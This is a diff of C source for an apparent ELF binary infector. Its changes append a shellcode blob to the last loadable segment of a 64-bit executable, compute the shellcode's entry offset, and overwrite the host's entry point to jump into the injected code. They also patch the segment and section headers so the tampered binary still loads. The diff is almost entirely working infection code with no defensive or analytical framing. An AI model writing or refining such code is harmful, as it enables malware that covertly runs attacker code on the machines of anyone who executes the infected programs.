@@ -11,9 +11,8 @@ void elf64_update_segments(void *b, size_t len, size_t pos, size_t add){
 	Elf64_Ehdr *h = b;
 	Elf64_Phdr *ph = b + h->e_phoff;
 	int n = h->e_phnum;
-	size_t start = h->e_phoff + h->e_phnum * sizeof(*ph);
 	for (int i = 0; i < n; i += 1){
-		if (start + ph->p_offset > pos) {
+		if (ph->p_offset > pos) {
 			ph->p_offset += add;
 			ph->p_vaddr += add;
 			ph->p_paddr += add;
@@ -59,33 +58,41 @@ int find_last_loaded_segment(void *b, size_t len, int *pos){
 	return TRUE;	 
 }
 
+int find_entry_in_file(void *b, size_t len, size_t *e){
+	Elf64_Ehdr *h = b;
+	size_t entry = h->e_entry;
+	int n = h->e_phnum;
+	size_t pos = 0;
+	Elf64_Phdr *ph = b + h->e_phoff;
+	for (int i = 0; i < n; i += 1){
+		if (ph[i].p_type == PT_LOAD && 
+				entry > ph[i].p_vaddr && entry < ph[i].p_vaddr + ph[i].p_filesz){
+			*e = ph[i].p_offset + (entry - ph[i].p_vaddr);
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
 void elf_replace_s(char **s, size_t *len, char *shellcode, int slen){
 
 	int x = 0;
 	find_last_loaded_segment(*s, *len, &x);
-	
+
 	Elf64_Ehdr *h = (*s);
 	Elf64_Phdr *ph = (*s) + h->e_phoff;
-	
-	printf("segment: %d\n", x);
-	
-	int start = h->e_phoff + h->e_phnum * sizeof(*ph);
-	
-	size_t pos = start + ph[x].p_offset + ph[x].p_filesz;
-	
-	printf("start:%zx\n", start);
-	printf("pos:%zx\n", pos);
-	printf("sh_offset:%zx\n", h->e_shoff);
+
+	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	insert(s, len, pos, shellcode, slen);
 	h = (*s);
 	ph = (*s) + h->e_phoff;
 
 	//get entry point of shellcode:
-	Elf64_Ehdr *shellh = (Elf64_Ehdr *)shellcode;
-	size_t shellpos = shellh->e_phoff + shellh->e_phnum * sizeof(*ph); 
-
-	printf("entry zone: %zx\n", ph[x].p_vaddr + ph[x].p_filesz + shellpos);
-	h->e_entry = ph[x].p_vaddr + ph[x].p_filesz + shellpos;//0x6012f9;
+	size_t entry;
+	find_entry_in_file(shellcode, slen, &entry);
+	printf("pos: %zu + %zu = %zu\n", pos, entry, pos + entry);
+	h->e_entry = ph[x].p_vaddr + ph[x].p_filesz + entry;
+	printf("entry: %zu\n", h->e_entry);
 
 	ph[x].p_filesz += slen;
 	ph[x].p_memsz += slen;
@@ -93,7 +100,7 @@ void elf_replace_s(char **s, size_t *len, char *shellcode, int slen){
 
 	elf64_update_header(*s, *len, pos, slen);
 	elf64_update_sections_header(*s, *len, pos, slen);
-	//elf64_update_segments(*s, *len, pos, slen);
+	elf64_update_segments(*s, *len, pos, slen);
 }
 
 void inject_binary(char *s, size_t n){
